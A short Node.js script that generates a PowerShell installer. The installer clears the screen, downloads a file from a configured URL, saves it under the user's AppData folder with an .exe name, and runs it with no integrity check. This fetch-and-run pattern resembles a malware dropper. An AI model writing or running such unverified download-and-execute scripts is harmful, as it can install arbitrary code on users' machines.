const fs = require('fs');

const { REPO_NAME, BASE_URL, SHEBANG_PWSH } = require('./constants');

fs.writeFileSync(
  'install.ps1',
  `${SHEBANG_PWSH}
$ProcName = "${REPO_NAME}.exe"
$WebFile = "${BASE_URL}/${REPO_NAME}/lib/${REPO_NAME}.js"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
Start-Process ("$env:APPDATA\$ProcName")`,
);
